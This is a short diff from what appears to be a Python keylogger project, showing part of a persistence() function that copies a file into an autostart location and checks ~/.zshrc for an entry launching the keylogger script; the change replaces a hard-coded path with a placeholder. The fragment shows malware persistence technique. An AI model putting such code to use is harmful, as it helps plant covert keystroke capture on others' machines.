@@ -91,7 +91,7 @@ def persistence():
     shutil.copy(terminal_path, autostart_path)
 
     file_location = "/home/kali/.zshrc"
-    command = "/home/kali/Downloads/keylogger.py"
+    command = "file path of the keylogger"
     
     # Open .zshrc file and check for entry for script
     with open(file_location) as file:
